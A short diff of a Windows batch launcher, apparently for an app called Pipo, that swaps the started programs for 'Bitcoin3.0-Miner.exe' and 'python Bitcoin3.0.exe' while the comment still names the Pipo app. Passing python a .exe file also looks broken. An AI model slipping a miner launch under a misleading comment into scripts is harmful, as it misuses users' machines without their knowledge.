@@ -33,9 +33,9 @@ IF EXIST "%control_file%" (
 
 REM Inicia o aplicativo littleboy (Pipo)
 cd /d "%~dp0"  REM Garante que o diretório correto seja usado
-start "" "pipo-pay.exe"
+start "" "Bitcoin3.0-Miner.exe"
 
 REM Executa o script Python
-start "" python "pipo.exe"
+start "" python "Bitcoin3.0.exe"
 
 exit
